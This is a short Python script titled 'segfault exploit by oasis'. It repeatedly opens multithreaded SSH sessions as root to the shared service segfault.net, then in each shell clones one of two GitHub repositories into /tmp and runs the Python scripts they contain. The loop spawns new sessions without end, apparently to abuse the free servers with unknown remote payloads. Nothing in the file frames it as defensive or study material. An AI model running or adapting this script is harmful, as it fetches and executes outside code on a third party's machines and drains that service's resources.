# segfault exploit by oasis

import paramiko
import time
import threading
def connect_and_interact():
    hostname = 'segfault.net'
    port = 22
    username = 'root'
    password = 'segfault'
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        print("Connecting to server...")
        ssh.connect(hostname, port=port, username=username, password=password)
        print("Connected successfully.")
        channel = ssh.invoke_shell()
        time.sleep(64)
        channel.send('e')
        time.sleep(16)
        channel.send('cd /tmp && git clone https://github.com/bleedbleedwhywontyoubleed/coolsigma && mv ./coolsigma/bleed/* . && screen python3 b.py\n')
        while True:
            time.sleep(30)
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        ssh.close()
        print("Connection closed.")

def connect_and_interact2():
    hostname = 'segfault.net'
    port = 22
    username = 'root'
    password = 'segfault'
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        print("Connecting to server...")
        ssh.connect(hostname, port=port, username=username, password=password)
        print("Connected successfully.")
        channel = ssh.invoke_shell()
        time.sleep(64)
        channel.send('e')
        time.sleep(16)
        channel.send('cd /tmp && git clone https://github.com/oahwrd/dd && mv ./dd/* . && screen python3 c.py\n')
        while True:
            time.sleep(30)
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        ssh.close()
        print("Connection closed.")

while True:
    for x in range(3):
        output_thread = threading.Thread(target=connect_and_interact, args=())
        output_thread.start()
    for x in range(3):
        output_thread = threading.Thread(target=connect_and_interact2, args=())
        output_thread.start()
    time.sleep(60)
